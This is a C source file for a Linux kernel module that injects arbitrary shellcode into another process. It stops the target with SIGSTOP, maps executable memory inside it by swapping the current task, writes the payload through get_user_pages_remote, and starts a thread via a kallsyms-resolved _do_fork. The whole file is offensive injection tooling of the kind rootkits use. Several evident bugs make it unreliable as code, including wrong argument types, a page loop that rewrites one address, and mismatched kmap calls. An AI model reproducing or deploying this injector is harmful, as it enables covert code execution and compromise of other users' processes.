#include "shellcode_injector.h"

#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/mman.h>
#include <linux/highmem.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/kallsyms.h>
#include <uapi/asm-generic/mman-common.h>

#include "consts.h"

#define KERNEL_PRIV 1
#define STACK_SIZE	(4096 * 1024)
#define CREATE_THREAD_FLAGS (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_PARENT | CLONE_THREAD | CLONE_IO)

typedef long (*resolved_do_fork)(unsigned long, unsigned long , unsigned long, int __user *, int __user *, unsigned long);

int inject_shellcode_ioctl_parser(unsigned long arg, ShellcodeInjectionParameters* parameters) {
    unsigned long status;
    void* shellcode_usermode_address;
    status = copy_from_user((void*)parameters, (void*)arg, sizeof(ShellcodeInjectionParameters));
    shellcode_usermode_address = parameters->shellcode;
    parameters->shellcode = kmalloc(parameters->shellcode_size, GFP_KERNEL);
    status = copy_from_user(parameters->shellcode, shellcode_usermode_address, parameters->shellcode_size);
    if (SUCCESS != status) {
        return -EFAULT;
    }
    return SUCCESS;
}

int write_process_memory_page(struct task_struct* task, void* user_address, void* kernel_address, int len) {
    void* kaddr;
	struct page* page;
	struct vm_area_struct* vma;
	int ret;
	ret = get_user_pages_remote(task, task->mm, (unsigned long)user_address, 1, FOLL_WRITE, &page, &vma, NULL);
	if (0 >= ret) {
		return GET_USER_PAGE_REMOTE_FAILED;
	}
	kaddr = kmap_atomic(page);
    
    memcpy(kaddr, kernel_address, len);

    kunmap(page);
	set_page_dirty_lock(page);
	put_page(page);
	return SUCCESS;
}

int write_process_memory(struct task_struct* task, void* user_address, void* kernel_address, int len) {
    int i;
    int status;
    if (PAGE_SIZE >= len) {
        return write_process_memory_page(task, user_address, kernel_address, len);
    }
    for (i = 0; i <= len; i += PAGE_SIZE) {
        status = write_process_memory_page(task, user_address, kernel_address, len);
        if (SUCCESS != status)
        {
            return status;
        }
    }
    if (i > len) {
        return write_process_memory_page(task, user_address, kernel_address, len - (i - PAGE_SIZE));
    }
    return SUCCESS;
}


int inject_shellcode(ShellcodeInjectionParameters* parameters) {
    int status;
    struct task_struct* target_task;
    struct task_struct* prev_task;
    struct pid* pid_struct;
    void* target_allocated_memory_address;
    void* target_parent_tidptr;
    void* target_child_tidptr;
    void* target_stack;
    resolved_do_fork resolved_fork;
    
    printk(KERN_INFO "Start injecting the shellcode to pid %d\n", parameters->pid);
    
    // find the target process
    pid_struct = find_get_pid(parameters->pid);
    target_task = pid_task(pid_struct, PIDTYPE_PID);
    if (NULL == target_task) {
        return INVALID_PID;
    }
    
    // stop the target process
    status = send_sig(SIGSTOP, target_task, KERNEL_PRIV);
    if (0 > status) {
        printk(KERN_INFO "Unable to stop the process, pid %d\n", parameters->pid);
        return SIGSTOP_FAILED;
    }
    printk(KERN_INFO "The process stopped successfully, pid %d\n", parameters->pid);
    
    prev_task = get_current();

    // vm_mmap use current task and we doesnt want to allocate the memory at the sender task
    // we want to allocate the memory at the target therfore we have to change the current task
    current_task = target_task;
    
    // allocate memory for the shellcode in the target process
    target_allocated_memory_address = (void*)vm_mmap(NULL, 0, parameters->shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0);
    if (NULL == target_allocated_memory_address) {
        printk(KERN_INFO "Failed to allocate memory in process, pid %d\n", parameters->pid);
        status = REMOTE_MEMORY_ALLOC_FAILED;
        goto release_process;
    }
    printk(KERN_INFO "Allocate memory in the target process succeeded, pid %d\n", parameters->pid);

    
    // write shellcode to the allocated memory
    status = write_process_memory(target_task, target_allocated_memory_address, parameters->shellcode, parameters->shellcode_size);
    if (SUCCESS != status) {
        printk(KERN_INFO "Write process memory failed, pid %d\n", parameters->pid);
        goto release_resources;
    }
    printk(KERN_INFO "Write memory in the target process succeeded, pid %d\n", parameters->pid);

    target_stack = (void*)vm_mmap(NULL, 0, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN, 0);
    target_parent_tidptr = (void*)vm_mmap(NULL, 0, sizeof(unsigned long), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0);
    target_child_tidptr = (void*)vm_mmap(NULL, 0, sizeof(unsigned long), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0);
    write_process_memory(target_stack, target_stack + STACK_SIZE - sizeof(unsigned long), &target_allocated_memory_address, sizeof(unsigned long));
    resolved_fork = (resolved_do_fork)kallsyms_lookup_name("_do_fork");
    resolved_fork(CREATE_THREAD_FLAGS, (unsigned long)target_stack, STACK_SIZE, target_parent_tidptr, target_child_tidptr, 0);
    return SUCCESS;

release_resources:
    vm_munmap((unsigned long)target_allocated_memory_address, parameters->shellcode_size);
release_process:
    send_sig(SIGCONT, target_task, KERNEL_PRIV);
    return status;
}